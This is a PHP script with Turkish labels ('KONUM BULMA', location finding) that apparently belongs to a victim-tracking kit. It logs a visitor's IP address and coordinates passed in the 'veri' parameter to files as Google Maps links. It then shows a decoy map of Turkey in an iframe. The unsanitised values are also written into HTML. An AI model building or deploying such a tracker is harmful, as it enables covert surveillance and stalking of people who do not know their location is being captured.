<?php 
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
    }
if (isset($_GET["veri"])) {
$save = fopen("_command","w");
$save_2 = fopen("saved_info.txt","a+");
date_default_timezone_set('Europe/Istanbul');
$tarih = date('d/m/Y H:i:s');
$command = ("
+-+-+ KONUM BULMA +-+-+

 Tarih         : $tarih

 İp Adresi     : $ipaddress

 Konum Link    : https://www.google.com/maps/place/.$_GET[veri]

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
");

$saved_info = ("
<ul class='saved-box'>
	<li class='saved-title'>KONUM BULMA</li><br>
	<li>Tarih         : <a>$tarih</a></li>
	<li>İp Adresi     : <a href='/ip-scan/index.php?ip=$ipaddress'>$ipaddress</a></li>
	<li><a href=\"https://www.google.com/maps/place/.$_GET[veri]\" style='display: block;font-size: 25px;text-align: center;color:#2cfc00'>Konuma Gitmek İçin Tıkla</a></li>
</ul><hr><br>
");
fwrite($save,$command);
fwrite($save_2,$saved_info);
fclose($save);
fclose($save_2);
}else{
	echo '<script>alert("Lütfen bir veri giriniz.")</script>';
	echo "<script>javascript:history.go(-1)</script>";
	exit();
}

?>
<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d12743676.862055203!2d26.178285126945873!3d38.757987208864336!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x14b0155c964f2671%3A0x40d9dbd42a625f2a!2zVMO8cmtpeWU!5e0!3m2!1str!2str!4v1564815634369!5m2!1str!2str" width="100%" height="100%" frameborder="0" style="border:0" allowfullscreen></iframe>
